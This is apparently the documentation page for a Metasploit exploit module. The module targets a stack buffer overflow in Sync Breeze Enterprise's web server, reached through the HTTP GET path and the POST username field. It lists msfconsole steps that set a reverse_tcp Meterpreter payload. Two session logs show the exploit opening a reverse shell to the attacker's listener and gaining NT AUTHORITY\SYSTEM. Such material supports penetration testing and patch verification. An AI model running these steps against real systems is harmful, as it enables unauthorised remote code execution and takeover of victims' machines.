## Vulnerable Application

[Sync Breeze Enterprise](http://www.syncbreeze.com) versions up to v9.4.28, v10.0.28, and v10.1.16
are affected by a stack-based buffer overflow vulnerability which can be leveraged by an attacker
to execute arbitrary code in the context of NT AUTHORITY\SYSTEM on the target. The vulnerabilities
are caused by improper bounds checking of the request path in HTTP GET requests and username value
via HTTP POST requests sent to the built-in web server, respectively.

This module has been tested successfully on Windows 7 SP1. The vulnerable applications are available
for download at [Sync Breeze Enterprise v9.4.28](http://www.syncbreeze.com/setups/syncbreezeent_setup_v9.4.28.exe)
and [Sync Breeze Enterprise v10.0.28](http://www.syncbreeze.com/setups/syncbreezeent_setup_v10.0.28.exe).

## Verification Steps

  1. Install a vulnerable Sync Breeze Enterprise
  2. Start `Sync Breeze Enterprise` service
  3. Start `Sync Breeze Enterprise` client application
  4. Navigate to `Tools` > `Sync Breeze Options` > `Server`
  5. Check `Enable Web Server On Port 80` to start the web interface
  6. Start `msfconsole`
  7. Do `use exploit/windows/http/syncbreeze_bof`
  8. Select appropriate target via `set target 0` or `set target 1`
  9. Do `set RHOST ip`
  10. Do `check`
  11. Verify the target is vulnerable
  12. Do `set PAYLOAD windows/meterpreter/reverse_tcp`
  13. Do `set LHOST ip`
  14. Do `exploit`
  15. Verify the Meterpreter session is opened

## Scenarios

###Sync Breeze Enterprise v9.4.28 on Windows 7 SP1

```

msf exploit(syncbreeze_bof) > show options 

Module options (exploit/windows/http/syncbreeze_bof):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST    192.168.2.10     yes       The target address
   RPORT    80               yes       The target port
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.2.187    yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Sync Breeze Enterprise v9.4.28


msf exploit(syncbreeze_bof) > exploit 

[*] Started reverse TCP handler on 192.168.2.187:4444 
[*] Sending request...
[*] Sending stage (957427 bytes) to 172.16.0.18
[*] Meterpreter session 1 opened (172.16.0.20:4444 -> 172.16.0.18:49162) at 2017-05-16 11:00:25 +0100

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo 
Computer        : PC-01
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : pt_PT
Domain          : LAB
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter >
```

###Sync Breeze Enterprise v10.0.28 on Windows 7 SP1

```
msf > use exploit/windows/http/syncbreeze_bof 
msf exploit(syncbreeze_bof) > set rhost 192.168.10.61
rhost => 192.168.10.61
msf exploit(syncbreeze_bof) > set target 1
target => 1
msf exploit(syncbreeze_bof) > exploit

[*] Started reverse TCP handler on 192.168.10.60:4444 
[*] Sending request...
[*] Sending stage (171583 bytes) to 192.168.10.61
[*] Meterpreter session 1 opened (192.168.10.60:4444 -> 192.168.10.61:4129) at 2017-10-09 13:22:15 -0400
[+] negotiating tlv encryption
[+] negotiated tlv encryption
[+] negotiated tlv encryption

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : MUSHROOMKINGDOM
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
```